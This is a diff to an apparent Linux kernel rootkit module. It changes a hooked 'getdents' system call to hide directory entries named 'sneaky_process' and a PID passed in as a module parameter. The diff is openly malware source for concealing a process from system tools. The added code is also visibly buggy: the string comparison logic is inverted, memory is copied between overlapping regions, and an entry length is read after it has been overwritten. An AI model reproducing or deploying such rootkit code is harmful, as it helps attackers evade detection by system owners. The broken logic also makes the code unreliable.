@@ -9,6 +9,9 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+static int pid;
+module_param(pid, int, 0);
+
 struct linux_dirent {
   u64 d_ino;
   s64 d_off;
@@ -56,7 +59,24 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-  return original_getdents(fd, durp, count);
+  int byteNum = original_getdents(fd, dirp, count);
+  int pos = 0;
+  char pid_buffer [10];
+  snprintf(pid_buffer, 10, "%d", pid);
+  while (pos < byteNum) {
+    linux_dirent *curDirp = (void *)dirp + pos;
+    if (strcmp(curDirp->d_name, "sneaky_process") || strcmp(curDirp->d_name, pid_buffer)) {
+      void * end = (void *)dirp + byteNum;
+      void * curEnd = (void *)curDirp + curDirp->d_reclen;
+      size_t num = (size_t)(end - curEnd);
+      memcpy(curDirp, (void *)curDirp + curDirp->d_reclen, num); 
+      byteNum = byteNum - curDirp->d_reclen;
+      continue;
+    }
+    pos += curDirp->d_reclen;
+
+  }
+  return byteNum;
 }
 
 //Define our new sneaky version of the 'read' syscall
